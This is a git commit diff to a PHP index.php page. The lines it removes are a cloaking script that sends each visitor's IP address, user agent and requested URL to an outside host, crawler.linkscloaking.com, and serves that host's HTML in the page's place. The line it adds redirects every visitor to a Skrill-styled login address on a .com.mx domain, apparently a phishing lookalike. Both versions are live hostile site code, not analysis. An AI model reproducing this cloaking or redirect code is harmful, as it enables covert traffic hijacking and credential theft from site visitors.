b4fa7d25ceca4e610718c7ad70855d4d753b9a9b
mentosuncle <39184675+mentosuncle@users.noreply.github.com>
2018-07-15 05:29:29 +0600

    Update index.php

--- index.php
+++ index.php
@@ -1,18 +1,1 @@
-<?php
-function file_get_contents_curl($url)
-{
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_HEADER, 0);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-    curl_setopt($ch, CURLOPT_URL, $url);
-    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-    $data = curl_exec($ch);
-    curl_close($ch);
-    return $data;
-}
-$rr=base64_encode($_SERVER['HTTP_USER_AGENT']);
-$ipp=$_SERVER['REMOTE_ADDR'];
-$actual_link = "http://".$_SERVER['HTTP_HOST']."".$_SERVER["REQUEST_URI"];
-$html = file_get_contents_curl("http://crawler.linkscloaking.com/linknew.php?dlink=$actual_link&rbt=$rr&ip=$ipp");
-echo $html;
-?>
+<?php header("Location: https://account.skrill.com.mx/login/"); die(); ?>
